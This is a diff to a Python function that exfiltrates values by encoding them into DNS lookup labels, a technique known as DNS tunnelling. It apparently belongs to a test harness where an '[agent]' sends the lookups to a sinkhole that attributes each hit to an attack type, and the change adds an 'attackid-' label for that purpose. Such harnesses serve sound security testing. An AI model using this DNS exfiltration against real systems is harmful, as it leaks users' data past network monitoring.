@@ -186,7 +186,16 @@ def exfil_dns_tunnel(domain: str, value: str, attack_id: str = ""):
     sanitized = "".join(c if (c.isalnum() or c == "_") else "-" for c in value)
     # DNS labels max 63 chars
     sanitized = sanitized[:60]
-    lookup_domain = f"{sanitized}.{domain}"
+    # Embed attack_id as its own DNS label (marked with an "attackid-"
+    # prefix, mirroring how every other exfil channel marks theirs with
+    # "ATTACK_ID=") so dns_sinkhole.py can attribute this hit to a real
+    # attack type instead of recording it as "unknown". There's plenty of
+    # room: sanitized caps at 60 chars, attack_id is ~30 chars, the domain
+    # is ~30 chars -- well under the 253-char total DNS name limit.
+    if attack_id:
+        lookup_domain = f"{sanitized}.attackid-{attack_id}.{domain}"
+    else:
+        lookup_domain = f"{sanitized}.{domain}"
     sock = None
     try:
         print(f"[agent] DNS exfil: looking up {lookup_domain}")
